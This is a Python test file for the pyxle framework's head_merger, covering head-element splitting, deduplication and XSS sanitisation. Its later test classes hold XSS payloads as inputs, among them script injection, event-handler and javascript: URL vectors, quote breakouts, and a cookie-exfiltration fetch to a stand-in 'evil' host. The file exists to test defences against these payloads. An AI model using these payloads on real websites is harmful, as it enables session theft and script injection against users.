"""Extra coverage tests for head_merger internals."""

from __future__ import annotations

from pyxle.ssr.head_merger import (
    HeadElementAttributeParser,
    HeadElementSplitter,
    _escape_title_text_content,
    _extract_dedupe_key,
    _needs_splitting,
    sanitize_head_element,
)


class TestHeadElementSplitter:
    def test_boolean_attribute_no_value(self) -> None:
        """Boolean HTML attributes (e.g. `defer`) have no value — branch line 54."""
        splitter = HeadElementSplitter()
        elements = splitter.split('<script defer src="/app.js"></script>')
        assert len(elements) == 1
        # Boolean attribute should appear without quotes
        assert "defer" in elements[0]

    def test_nested_depth_ignored(self) -> None:
        """Tags nested inside an open element are captured as data, not new elements."""
        splitter = HeadElementSplitter()
        elements = splitter.split("<title>My <em>Site</em></title>")
        assert len(elements) == 1

    def test_split_error_returns_empty(self) -> None:
        """Malformed input that triggers an exception returns empty list (lines 100-102)."""
        # Provide deliberately broken HTML via monkey-patching the feed method
        splitter = HeadElementSplitter()

        def broken_feed(data: str) -> None:
            raise RuntimeError("simulated parse error")

        splitter.feed = broken_feed  # type: ignore[method-assign]
        result = splitter.split("<title>x</title>")
        assert result == []

    def test_depth_gt_zero_starttag_ignored(self) -> None:
        """A nested open tag when depth > 0 is swallowed into current_element."""
        # <div><span>x</span></div> — 'span' opens when depth == 1
        splitter = HeadElementSplitter()
        elements = splitter.split("<div><span>hello</span></div>")
        assert len(elements) == 1
        assert "hello" in elements[0]


class TestHeadElementAttributeParser:
    def test_exception_returns_none_and_empty_dict(self) -> None:
        """If feed raises, return (None, {}) (lines 30-32)."""
        parser = HeadElementAttributeParser()

        def broken_feed(data: str) -> None:
            raise RuntimeError("simulated error")

        parser.feed = broken_feed  # type: ignore[method-assign]
        tag, attrs = parser.get_tag_and_attributes("<meta name='x' />")
        assert tag is None
        assert attrs == {}

    def test_get_tag_and_attributes_not_found(self) -> None:
        """Empty string yields no tag (line 19->exit when found stays False)."""
        parser = HeadElementAttributeParser()
        tag, attrs = parser.get_tag_and_attributes("")
        assert tag is None
        assert attrs == {}

    def test_second_starttag_ignored(self) -> None:
        """Second open tag is ignored once `found` is True (line 19->exit branch)."""
        parser = HeadElementAttributeParser()
        # Feed two tags — only the first should be captured
        tag, attrs = parser.get_tag_and_attributes('<meta name="first"><meta name="second">')
        assert tag == "meta"
        assert attrs.get("name") == "first"


class TestHeadElementSplitterExtra:
    def test_mismatched_endtag_ignored(self) -> None:
        """An end tag that doesn't match current_tag is ignored (line 74->exit branch)."""
        splitter = HeadElementSplitter()
        # Opening a <title> then closing with </div> — the end tag is ignored
        splitter.feed("<title>hello</title></div>")
        # The title should still be captured
        assert len(splitter.elements) == 1

    def test_save_element_empty_current(self) -> None:
        """_save_element with empty current_element (line 88->92 branch)."""
        splitter = HeadElementSplitter()
        splitter._save_element()  # call with empty current_element
        assert splitter.elements == []

    def test_save_element_whitespace_only(self) -> None:
        """_save_element when join+strip yields empty string (line 90->92 branch)."""
        splitter = HeadElementSplitter()
        splitter.current_element = ["   ", "\t"]
        splitter._save_element()
        assert splitter.elements == []


class TestNeedsSplitting:
    def test_single_element_returns_false(self) -> None:
        assert _needs_splitting("<title>Test</title>") is False

    def test_multiple_elements_returns_true(self) -> None:
        assert _needs_splitting('<title>Test</title>\n<meta name="desc" content="x"/>') is True

    def test_empty_returns_false(self) -> None:
        assert _needs_splitting("") is False


class TestExtractDedupeKey:
    def test_empty_string_returns_none(self) -> None:
        assert _extract_dedupe_key("") is None
        assert _extract_dedupe_key("   ") is None

    def test_unparseable_tag_returns_none(self) -> None:
        # A completely garbled string won't produce a valid tag
        assert _extract_dedupe_key("not html at all {{}}") is None

    def test_script_no_src_returns_none(self) -> None:
        # Inline script has no src → no dedup key
        assert _extract_dedupe_key("<script>console.log(1)</script>") is None


class TestMergeHeadElementsBranches:
    """Cover the deduplication branches in merge_head_elements."""

    def test_layout_element_with_no_dedupe_key_included(self) -> None:
        """Layout element with no dedupe key (inline script) gets included (lines 228-229, 268)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=(),
            layout_head_jsx_blocks=("<script>window.__init = true;</script>",),
        )
        assert any("__init" in el for el in result)

    def test_duplicate_layout_elements_deduplicated(self) -> None:
        """Two layout elements with the same key — only one kept (line 232->222 branch)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=(),
            layout_head_jsx_blocks=(
                "<title>First</title>",
                "<title>Second</title>",
            ),
        )
        # Only one title should remain
        title_els = [el for el in result if "<title>" in el]
        assert len(title_els) == 1

    def test_page_jsx_element_with_no_dedupe_key(self) -> None:
        """Page JSX inline script (no src) gets included without deduplication (line 256->249)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=("<script>console.log('page')</script>",),
            layout_head_jsx_blocks=(),
        )
        assert any("console.log" in el for el in result)

    def test_none_key_in_seen_skipped_in_assembly(self) -> None:
        """Items stored with key=None are handled separately; None key skipped in deduped loop (line 282->281)."""
        from pyxle.ssr.head_merger import merge_head_elements

        # A layout inline script (no dedupe key) and a page title (has dedupe key)
        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=("<title>Page Title</title>",),
            layout_head_jsx_blocks=("<script>console.log(1)</script>",),
        )
        # Both should be in the result (one deduped by title key, one non-deduped)
        assert any("<title>" in el for el in result)
        assert any("console.log" in el for el in result)

    def test_head_var_element_with_no_dedupe_key(self) -> None:
        """HEAD variable element with no dedupe key is collected in non_deupeable (line 271->274)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=("<script>window.foo = 1;</script>",),
            head_jsx_blocks=(),
            layout_head_jsx_blocks=(),
        )
        assert any("window.foo" in el for el in result)

    def test_whitespace_only_layout_element_skipped(self) -> None:
        """Whitespace-only element after strip is skipped (line 224->222 branch)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=(),
            layout_head_jsx_blocks=("   ", "<title>Test</title>"),
        )
        # Only the title should be present, not a blank entry
        assert len(result) == 1
        assert "<title>Test</title>" in result[0]

    def test_second_no_dedupe_layout_element_skips_none_key_insert(self) -> None:
        """Second no-dedupe layout element hits `None in seen_keys` branch (228->222)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=(),
            layout_head_jsx_blocks=(
                "<script>window.a = 1;</script>",
                "<script>window.b = 2;</script>",
            ),
        )
        # Both inline scripts appear (collected via non-deupeable pass)
        assert any("window.a" in el for el in result)
        assert any("window.b" in el for el in result)

    def test_head_var_duplicate_key_not_overwritten(self) -> None:
        """Second head_var element with same key hits elif-False branch (244->236)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=("<title>First</title>", "<title>Second</title>"),
            head_jsx_blocks=(),
            layout_head_jsx_blocks=(),
        )
        title_els = [el for el in result if "<title>" in el]
        assert len(title_els) == 1

    def test_page_jsx_duplicate_key_not_overwritten(self) -> None:
        """Second page_jsx element with same key hits elif-False branch (256->249)."""
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=("<title>First</title><title>Second</title>",),
            layout_head_jsx_blocks=(),
        )
        title_els = [el for el in result if "<title>" in el]
        assert len(title_els) == 1


# ---------------------------------------------------------------------------
# sanitize_head_element tests
# ---------------------------------------------------------------------------


class TestSanitizeHeadElement:
    """Tests for XSS sanitization of individual HEAD elements."""

    # --- title text escaping ---

    def test_title_text_unchanged_for_safe_content(self) -> None:
        assert sanitize_head_element("<title>My Page</title>") == "<title>My Page</title>"

    def test_title_escapes_script_injection(self) -> None:
        malicious = "<title></title><script>alert(1)</script></title>"
        result = sanitize_head_element(malicious)
        assert "<script>" not in result
        assert "&lt;script&gt;" in result
        # The sanitised version should still be wrapped in a single <title>…</title>
        assert result.startswith("<title>")
        assert result.endswith("</title>")

    def test_title_escapes_nested_tags(self) -> None:
        result = sanitize_head_element("<title><img src=x onerror=alert(1)></title>")
        assert "<img" not in result
        assert "&lt;img" in result

    def test_title_preserves_entities(self) -> None:
        result = sanitize_head_element("<title>Tom &amp; Jerry</title>")
        assert result == "<title>Tom &amp; Jerry</title>"

    def test_title_with_attributes_preserved(self) -> None:
        result = sanitize_head_element('<title data-head-key="main">Hello</title>')
        assert 'data-head-key="main"' in result
        assert ">Hello</title>" in result

    # --- event handler stripping ---

    def test_strips_onclick(self) -> None:
        result = sanitize_head_element('<meta name="x" onclick="alert(1)"/>')
        assert "onclick" not in result
        assert 'name="x"' in result

    def test_strips_onerror(self) -> None:
        result = sanitize_head_element('<link rel="icon" onerror="alert(1)" href="/icon.png"/>')
        assert "onerror" not in result
        assert 'href="/icon.png"' in result

    def test_strips_onload(self) -> None:
        result = sanitize_head_element('<meta onload="fetch(\'evil\')" name="desc" content="hi"/>')
        assert "onload" not in result
        assert 'name="desc"' in result

    def test_strips_mixed_case_event_handler(self) -> None:
        result = sanitize_head_element('<meta OnClick="x" name="a"/>')
        assert "OnClick" not in result.lower()

    # --- dangerous URL neutralisation ---

    def test_strips_javascript_href(self) -> None:
        result = sanitize_head_element('<link rel="stylesheet" href="javascript:alert(1)"/>')
        assert "javascript:" not in result
        assert 'rel="stylesheet"' in result

    def test_strips_javascript_src(self) -> None:
        result = sanitize_head_element('<script src="javascript:void(0)"></script>')
        assert "javascript:" not in result

    def test_strips_vbscript_href(self) -> None:
        result = sanitize_head_element('<link href="vbscript:MsgBox" rel="x"/>')
        assert "vbscript:" not in result

    def test_strips_javascript_with_whitespace(self) -> None:
        result = sanitize_head_element('<link href="  javascript:alert(1)" rel="x"/>')
        assert "javascript:" not in result

    def test_preserves_safe_href(self) -> None:
        original = '<link rel="stylesheet" href="/styles/main.css"/>'
        assert sanitize_head_element(original) == original

    def test_preserves_safe_src(self) -> None:
        original = '<script src="/js/analytics.js"></script>'
        assert sanitize_head_element(original) == original

    # --- edge cases ---

    def test_empty_string(self) -> None:
        assert sanitize_head_element("") == ""

    def test_whitespace_only(self) -> None:
        assert sanitize_head_element("   ") == ""

    def test_meta_without_dangerous_attrs(self) -> None:
        original = '<meta name="description" content="A safe description"/>'
        assert sanitize_head_element(original) == original

    def test_combined_attack_vector(self) -> None:
        """Element with multiple attack vectors should have all neutralised."""
        malicious = '<link rel="icon" href="javascript:alert(1)" onerror="fetch(\'x\')"/>'
        result = sanitize_head_element(malicious)
        assert "javascript:" not in result
        assert "onerror" not in result
        assert 'rel="icon"' in result


class TestHeadAttributeEscaping:
    """SEC-HEAD-XSS-1: attribute-value quote breakout must be neutralised, and
    only an allowlist of head tags may pass through."""

    def test_quote_breakout_in_meta_content_neutralised(self) -> None:
        # The canonical audit payload: a double-quote ends the attribute early
        # and injects a <script> after </head>.
        malicious = '<meta name="description" content="normal"></head><script>alert(1)</script>'
        result = sanitize_head_element(malicious)
        assert "<script>" not in result
        assert "</head>" not in result
        assert "alert(1)" not in result
        assert result == '<meta name="description" content="normal"/>'

    def test_realistic_loader_data_breakout_neutralised(self) -> None:
        # A loader feeds a search term into a meta tag; the term breaks out.
        term = 'shoes"><script>fetch("//evil/?c="+document.cookie)</script>'
        result = sanitize_head_element(f'<meta name="description" content="{term}"/>')
        assert "<script>" not in result
        assert "document.cookie" not in result
        # The (truncated, escaped) value survives as an inert attribute.
        assert result.startswith('<meta name="description" content="shoes')
        assert result.endswith("/>")

    def test_attribute_values_are_html_escaped(self) -> None:
        # An embedded quote is escaped to &quot; rather than closing the attr.
        result = sanitize_head_element('<meta name="x" content="a&quot;b">')
        assert "&quot;" in result
        assert result == '<meta name="x" content="a&quot;b"/>'

    def test_inline_script_without_src_preserved(self) -> None:
        # Inline init scripts in the head are a supported trusted-author feature.
        original = "<script>window.__init = true;</script>"
        assert sanitize_head_element(original) == original

    def test_inline_style_preserved(self) -> None:
        original = "<style>body{color:red}</style>"
        assert sanitize_head_element(original) == original

    def test_meta_refresh_rejected(self) -> None:
        result = sanitize_head_element('<meta http-equiv="refresh" content="0;url=//evil.test">')
        assert result == ""

    def test_meta_http_equiv_nonrefresh_kept(self) -> None:
        result = sanitize_head_element('<meta http-equiv="X-UA-Compatible" content="IE=edge">')
        assert 'http-equiv="X-UA-Compatible"' in result
        assert result.endswith("/>")

    def test_disallowed_tag_dropped(self) -> None:
        assert sanitize_head_element('<iframe src="//evil.test"></iframe>') == ""
        assert sanitize_head_element("<object data='x'></object>") == ""

    def test_breakout_via_link_attribute_neutralised(self) -> None:
        malicious = '<link rel="canonical" href="/x"><script>alert(1)</script>'
        result = sanitize_head_element(malicious)
        assert "<script>" not in result
        assert result == '<link rel="canonical" href="/x"/>'

    def test_no_tag_fails_closed(self) -> None:
        # A head string with no recognisable element is dropped, not echoed.
        assert sanitize_head_element("just some text, no tags") == ""

    def test_title_close_then_script_is_dropped(self) -> None:
        # A single injected </title> followed by a <script> must NOT leave a
        # live script in <head> — the markup after the close is discarded.
        result = sanitize_head_element(
            "<title>x</title><script>alert(document.cookie)</script>"
        )
        assert "<script>" not in result
        assert "document.cookie" not in result
        assert result == "<title>x</title>"

    def test_title_close_then_external_script_is_dropped(self) -> None:
        result = sanitize_head_element(
            '<title>Site</title><script src="//evil.test/x.js"></script>'
        )
        assert "<script" not in result
        assert "evil.test" not in result

    def test_title_close_then_svg_onload_is_dropped(self) -> None:
        result = sanitize_head_element("<title>Hi</title><svg onload=alert(1)>")
        assert "<svg" not in result
        assert "onload" not in result
        assert result == "<title>Hi</title>"

    def test_unclosed_title_with_script_is_escaped(self) -> None:
        # An unclosed <title> followed by markup must not return the raw input;
        # the markup is escaped into inert title text with a clean close.
        result = sanitize_head_element("<title>x<script>alert(document.cookie)</script>")
        assert "<script>" not in result
        assert "&lt;script&gt;" in result
        assert result.endswith("</title>")

    def test_attribute_name_with_quote_is_dropped(self) -> None:
        # A crafted attribute name containing a quote must not be emitted (it
        # would break the tag's attribute quoting).
        result = sanitize_head_element('<meta name="x" content="y" a"b=c>')
        assert result.count('"') % 2 == 0  # quotes stay balanced
        assert 'a"b' not in result
        assert 'name="x"' in result


class TestMergeHeadVariableXss:
    """End-to-end: the runtime HEAD-callable path (the documented dynamic-meta
    recipe) must not let loader data inject markup into <head>."""

    def test_loader_breakout_through_merge_is_inert(self) -> None:
        from pyxle.ssr.head_merger import merge_head_elements

        excerpt = '"><script>alert(document.cookie)</script>'
        result = merge_head_elements(
            head_variable=(f'<meta name="description" content="{excerpt}"/>',),
            head_jsx_blocks=(),
        )
        combined = " ".join(result)
        assert "<script>" not in combined
        assert "document.cookie" not in combined


class TestEscapeTitleTextContent:
    """Direct tests for the _escape_title_text_content helper."""

    def test_no_title_tag_returns_unchanged(self) -> None:
        html = '<meta name="x" content="y"/>'
        assert _escape_title_text_content(html) == html

    def test_title_without_closing_is_closed(self) -> None:
        # An unclosed <title> is escaped and given a clean close so it can't
        # swallow the rest of the document as RCDATA.
        assert _escape_title_text_content("<title>Unclosed") == "<title>Unclosed</title>"

    def test_multiple_close_tags_uses_last(self) -> None:
        html = "<title></title>extra</title>"
        result = _escape_title_text_content(html)
        # Everything between <title> and the LAST </title> is escaped
        assert "&lt;/title&gt;extra" in result


class TestMergeHeadElementsSanitization:
    """Verify that merge_head_elements applies sanitisation to all sources."""

    def test_head_variable_title_sanitised(self) -> None:
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=("<title><script>xss</script></title>",),
            head_jsx_blocks=(),
        )
        combined = " ".join(result)
        assert "<script>" not in combined
        assert "&lt;script&gt;" in combined

    def test_layout_jsx_event_handler_stripped(self) -> None:
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=(),
            layout_head_jsx_blocks=('<meta name="x" onclick="alert(1)"/>',),
        )
        combined = " ".join(result)
        assert "onclick" not in combined

    def test_page_jsx_javascript_url_stripped(self) -> None:
        from pyxle.ssr.head_merger import merge_head_elements

        result = merge_head_elements(
            head_variable=(),
            head_jsx_blocks=('<link href="javascript:alert(1)" rel="icon"/>',),
        )
        combined = " ".join(result)
        assert "javascript:" not in combined
